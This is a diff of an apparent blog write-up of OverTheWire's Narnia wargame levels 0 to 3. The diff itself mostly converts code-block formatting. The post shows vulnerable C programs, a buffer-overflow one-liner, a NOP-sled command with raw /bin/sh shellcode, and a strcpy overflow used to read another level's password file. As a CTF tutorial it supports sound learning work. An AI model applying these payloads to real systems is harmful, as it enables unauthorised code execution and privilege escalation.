@@ -9,18 +9,20 @@ categories: writeup OverTheWire
 
 Hello everyone. This will be the first of my two posts about Over The Wire's Narnia CTF. Today i will cover how i got the solution going from level 1 to 5. 
 Let's jump right into it!
+
 > Note: Every time you start a new level you need to connect by using an ssh command that looks like this:
 ```
 ssh narnia0@narnia.labs.overthewire.org -p 2226
 ```
 >and by provinding the password of the previous level. First password is `narnia0`
+{: .prompt-info }
 
 
 # *Narnia0*
 
 All binaries for the levels are located at the root folder `/narnia` and the password of each level are in `/etc/narnia_pass/`.Only the user owning the flag can read it. Let's cat out the source code of the first level:
 
-{% highlight c %}
+```c
 int main(){
     long val=0x41414141;
     char buf[20];
@@ -43,7 +45,7 @@ int main(){
 
     return 0;
 }
-{% endhighlight %}
+```
 Our objective is simple: We need to overwrite `val` with the hex value `0xdeadbeef` so that the program spawns a shell. I'm assuming you already know how a buffer overflow works, anyway here's a quick recap. Essentially because the buffer `buf` is only 20 bytes long but we can insert how many characters we want, we can write past the end of the buffer and thus overwriting whatever comes after, including the variable `val`.
 The following python command will do the job: `python -c "print('\xef\xbe\xad\xde'*40)"`
 This outputs the four bytes forming the word `0xdeadbeef` in reverse order becouse we are in [little endian](https://en.wikipedia.org/wiki/Endianness) 
@@ -63,7 +65,7 @@ And there's the flag! (It's redacted)
 # *Narnia1*
 Let's start by getting the source:
 
-{% highlight c %}
+```c
 #include <stdio.h>
 
 int main(){
@@ -80,7 +82,7 @@ int main(){
 
     return 0;
 }
-{% endhighlight %}
+```
 
 This programm will literally execute whatever is on the `EGG` [enviroment variable](https://en.wikipedia.org/wiki/Environment_variable). And by this I mean that the programm will interpret whatever the bytes in the `EGG` are and execute them as raw assembly instructions. Time for some shellcode! I really like the collection of [shell storm](http://shell-storm.org/shellcode/).
 We can assign an enviroment variable with the `export` command. I tried different shellcodes and at the end this worked for me:
@@ -97,7 +99,7 @@ Too easy?
 
 # *Narnia2*
 You guessed it, let's print the source!
-{% highlight c %}
+```c
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -114,7 +116,7 @@ int main(int argc, char * argv[]){
 
     return 0;
 }
-{% endhighlight %}
+```
 This is a classic buffer overflow where we also have to inject our shellcode. I will show you how i debug in gdb in the more advaneced challenges. However in this case I solved it by injecting a 100 bytes nop sled, the shellcode and 50 times the return address:
 ```
 narnia2@narnia:/narnia$ ./narnia2 $(python -c "print('\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+'\x32\xd5\xff\xff'*50)")
@@ -128,7 +130,7 @@ The only problem here was to guess the right return address, but with a nop sled
 
 # *Narnia3*
 Source again!
-{% highlight c %}
+```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -171,7 +173,7 @@ int main(int argc, char **argv){
 
     exit(1);
 }
-{% endhighlight %}
+```
 
 This seems a bit longer then the previous seen source codes, so what's going on here?
 Teoretically the content of whatever file we pass ass argument is copyied into the output file, that is hardcoded and is `/dev/null`. So essentially it's thrown away. But because of the insecure strcpy we can use a buffer overflow to also overwrite the contents of the output file. Everything we input will be used as input file but only the characters after 32 bytes(ifile length) will be interpreted as output file. We need to copy the contents of `/etc/natas_pass/narnia4` in a file we can read. To make this happend I did the following:
